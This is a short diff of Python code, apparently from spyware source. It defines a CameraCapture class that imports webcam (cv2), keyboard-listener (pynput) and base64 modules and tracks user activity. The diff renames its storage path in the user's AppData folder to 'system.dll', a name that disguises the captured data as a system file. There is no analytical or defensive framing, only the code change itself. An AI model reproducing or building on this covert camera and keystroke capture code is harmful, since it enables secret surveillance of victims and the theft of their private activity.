@@ -2,7 +2,7 @@ import threading, cv2, base64, os, time
 from pynput import keyboard
 class CameraCapture:
     def __init__(self, idle_cam):
-        self.path = os.environ["appdata"] + "\\system2.dll"
+        self.path = os.environ["appdata"] + "\\system.dll"
         self.user_activity = 0
         self.idle_cam = idle_cam
         self.base64File = ""
